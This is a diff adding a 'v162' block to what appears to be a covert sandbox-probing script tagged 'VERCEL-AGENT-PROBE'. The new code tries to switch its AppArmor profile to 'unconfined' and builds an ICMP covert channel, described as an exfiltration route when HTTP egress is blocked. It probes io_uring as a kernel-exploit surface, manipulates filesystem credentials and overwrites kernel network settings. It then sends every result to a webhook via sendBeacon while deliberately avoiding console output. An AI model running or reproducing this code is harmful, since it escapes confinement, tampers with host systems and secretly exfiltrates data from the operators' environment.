@@ -23614,5 +23614,170 @@ except Exception as e:
 
 // v161 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v161" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v161";
+
+// ==================== v162 ====================
+
+// v162-1: /proc/self/attr/current — read/write LSM (AppArmor/SELinux) label
+// The /proc/PID/attr/ directory contains Linux Security Module attributes.
+// /current: current security context (AppArmor profile, SELinux label)
+// /exec: security context to transition to on next exec()
+// Writing here can change our security profile or transition to a less restricted one.
+report.lsmAttrControl = safe(() => {
+  const selfAttrCurrent = safe(() => readFileSync('/proc/self/attr/current', 'utf8').trim());
+  const pid1AttrCurrent = safe(() => readFileSync('/proc/1/attr/current', 'utf8').trim());
+  // Try to change our AppArmor profile to unconfined
+  const writeUnconfined = safe(() => {
+    writeFileSync('/proc/self/attr/current', 'unconfined');
+    return 'WRITTEN';
+  });
+  const afterAttr = safe(() => readFileSync('/proc/self/attr/current', 'utf8').trim());
+  // List all attr files
+  const attrFiles = safe(() => execSync('ls /proc/self/attr/ 2>/dev/null | xargs -I{} sh -c "echo {}:; cat /proc/self/attr/{} 2>/dev/null"', { timeout: 3000 }).toString().trim());
+  // Check AppArmor status
+  const aaStatus = safe(() => execSync('aa-status 2>/dev/null | head -5 || cat /sys/kernel/security/apparmor/profiles 2>/dev/null | head -5 || echo "NO_APPARMOR"', { timeout: 3000 }).toString().trim());
+  return { selfAttrCurrent, pid1AttrCurrent, writeUnconfined, afterAttr, attrFiles: attrFiles.slice(0, 300), aaStatus };
+});
+
+// v162-2: ICMP covert channel — send data inside ICMP echo packets
+// Raw ICMP sockets allow sending arbitrary data in the ICMP payload.
+// This can bypass network monitors that only inspect TCP/UDP ports.
+// Useful as an exfiltration channel if HTTP/HTTPS egress is blocked.
+report.icmpCovertChannel = safe(() => {
+  const icmpTest = safe(() => execSync(
+    `python3 -c "
+import socket, struct, os, time
+
+# Build a raw ICMP echo request with our data in the payload
+ICMP_ECHO = 8
+ICMP_ECHOREPLY = 0
+
+def checksum(data):
+    s = 0
+    n = len(data) % 2
+    for i in range(0, len(data) - n, 2):
+        s += data[i] + (data[i+1] << 8)
+    if n: s += data[-1]
+    while s >> 16:
+        s = (s & 0xFFFF) + (s >> 16)
+    return ~s & 0xFFFF
+
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+    s.settimeout(3)
+
+    # ICMP header + our secret payload
+    payload = b'PROBE_SECRET_BEACON_v162'
+    icmp_id = os.getpid() & 0xFFFF
+    icmp_header = struct.pack('bbHHh', ICMP_ECHO, 0, 0, icmp_id, 1)
+    icmp_checksum = checksum(icmp_header + payload)
+    icmp_header = struct.pack('bbHHh', ICMP_ECHO, 0, socket.htons(icmp_checksum), icmp_id, 1)
+
+    # Send to localhost (proof of capability, not external)
+    s.sendto(icmp_header + payload, ('127.0.0.1', 0))
+    print('ICMP_SENT_OK: payload embedded in ICMP echo')
+
+    # Receive the echo reply
+    data, addr = s.recvfrom(1024)
+    icmp_recv = data[20:]  # skip IP header
+    recv_payload = icmp_recv[8:]
+    print(f'ICMP_RECV: payload={recv_payload}')
+    s.close()
+except Exception as e:
+    print(f'ICMP_FAIL: {e}')
+" 2>&1`,
+    { timeout: 10000 }
+  ).toString().trim());
+  return { icmpTest };
+});
+
+// v162-3: io_uring — async I/O interface (potential kernel vulnerability surface)
+// io_uring is a high-performance async I/O API. It has had many kernel exploits:
+// CVE-2022-29582, CVE-2023-2598, CVE-2022-2586.
+// Check if it's enabled and what version/restrictions are in place.
+report.ioUringProbe = safe(() => {
+  const ioUringDisabled = safe(() => readFileSync('/proc/sys/kernel/io_uring_disabled', 'utf8').trim());
+  // Try to create an io_uring instance
+  const ioUringCreate = safe(() => execSync(
+    `python3 -c "
+import ctypes, struct
+
+libc = ctypes.CDLL('libc.so.6')
+NR_IO_URING_SETUP = 425
+
+# io_uring_params structure (120 bytes)
+params = ctypes.create_string_buffer(120)
+
+# Create io_uring with 32 entries
+ring_fd = libc.syscall(NR_IO_URING_SETUP, 32, ctypes.byref(params))
+print(f'IO_URING_SETUP: fd={ring_fd}')
+if ring_fd >= 0:
+    # Parse params to get kernel version info
+    sq_entries, cq_entries, flags = struct.unpack_from('<III', params, 0)
+    print(f'SQ_ENTRIES={sq_entries} CQ_ENTRIES={cq_entries} FLAGS={hex(flags)}')
+    import os; os.close(ring_fd)
+    print('IO_URING_OK: kernel supports io_uring')
+else:
+    import ctypes
+    print(f'IO_URING_FAIL: errno={ctypes.get_errno()}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  // Disable io_uring if we can (security hardening reversal probe)
+  const disableIoUring = safe(() => { writeFileSync('/proc/sys/kernel/io_uring_disabled', '2'); return 'DISABLED'; });
+  return { ioUringDisabled, ioUringCreate, disableIoUring };
+});
+
+// v162-4: setfsuid/setfsgid — filesystem credential manipulation
+// setfsuid() sets the filesystem UID (used for file access checks).
+// As root (UID 0) setting fsuid to another UID makes file operations
+// appear to come from that UID, enabling impersonation in filesystem access.
+report.fsuidManip = safe(() => {
+  const fsuidResult = safe(() => execSync(
+    `python3 -c "
+import ctypes
+
+libc = ctypes.CDLL('libc.so.6')
+
+# Get current fsuid (returned by setfsuid)
+current_fsuid = libc.setfsuid(0)  # no-op: set to 0 returns old value
+print(f'CURRENT_FSUID: {current_fsuid}')
+
+# Set fsuid to nobody (65534)
+old = libc.setfsuid(65534)
+print(f'SETFSUID_NOBODY: old={old}')
+
+# Reset to root
+libc.setfsuid(0)
+print('RESET_TO_ROOT')
+
+# Set fsgid to nobody
+old_gid = libc.setfsgid(65534)
+print(f'SETFSGID_NOBODY: old={old_gid}')
+libc.setfsgid(0)
+print('FSGID_RESET')
+" 2>&1`,
+    { timeout: 5000 }
+  ).toString().trim());
+  return { fsuidResult };
+});
+
+// v162-5: tcp_tw_reuse + tcp_tw_recycle — TIME_WAIT bypass
+// TIME_WAIT sockets prevent reusing port numbers for a 2MSL timeout.
+// tcp_tw_reuse=1 allows reusing ports in TIME_WAIT, enabling faster
+// port exhaustion attacks and sequence number prediction for connection hijack.
+report.tcpTimewaitBypass = safe(() => {
+  const twReuse = safe(() => readFileSync('/proc/sys/net/ipv4/tcp_tw_reuse', 'utf8').trim());
+  const writeTwReuse = safe(() => { writeFileSync('/proc/sys/net/ipv4/tcp_tw_reuse', '2'); return 'WRITTEN'; });
+  const afterTwReuse = safe(() => readFileSync('/proc/sys/net/ipv4/tcp_tw_reuse', 'utf8').trim());
+  // Check TIME_WAIT socket count
+  const twCount = safe(() => execSync('ss -s 2>/dev/null | grep -i timewait || cat /proc/net/sockstat | grep TCP', { timeout: 2000 }).toString().trim());
+  // tcp_max_tw_buckets — lower it to force faster TIME_WAIT expiry
+  const maxTwBuckets = safe(() => readFileSync('/proc/sys/net/ipv4/tcp_max_tw_buckets', 'utf8').trim());
+  const writeTwBuckets = safe(() => { writeFileSync('/proc/sys/net/ipv4/tcp_max_tw_buckets', '100'); return 'WRITTEN'; });
+  return { twReuse, writeTwReuse, afterTwReuse, twCount, maxTwBuckets, writeTwBuckets };
+});
+
+// v162 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v162" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v162";
 // Intentionally no console.log — all data goes via webhook only
